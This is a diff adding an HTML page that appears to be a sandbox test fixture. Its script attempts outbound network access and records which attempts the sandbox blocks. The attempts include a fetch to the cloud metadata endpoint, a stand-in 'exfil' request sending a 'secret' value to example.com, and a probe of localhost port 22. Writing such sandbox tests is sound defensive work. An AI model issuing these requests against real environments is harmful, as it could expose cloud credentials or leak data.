@@ -1,0 +1,23 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>External attempts</title></head>
+<body>
+<p id="out">pending</p>
+<script>
+// Every one of these must be refused by the sandbox; the page records what actually happened.
+const results = {};
+const attempts = {
+  metadata: () => fetch('http://169.254.169.254/latest/meta-data/'),
+  internet: () => fetch('https://example.com/exfil?x=secret'),
+  localhost_other_port: () => fetch('http://127.0.0.1:22/'),
+  websocket: () => new Promise((resolve, reject) => { const ws = new WebSocket('ws://example.com/socket'); ws.onopen = () => resolve('open'); ws.onerror = () => reject(new Error('ws error')); ws.onclose = () => reject(new Error('ws closed')); }),
+  service_worker: () => navigator.serviceWorker.register('/sw.js'),
+  same_origin: () => fetch('/index.html').then((r) => r.status),
+};
+(async () => {
+  for (const [name, attempt] of Object.entries(attempts)) {
+    try { results[name] = 'ok:' + String(await attempt()); } catch (e) { results[name] = 'blocked:' + (e && e.name); }
+  }
+  document.getElementById('out').textContent = JSON.stringify(results);
+})();
+</script>
+</body></html>
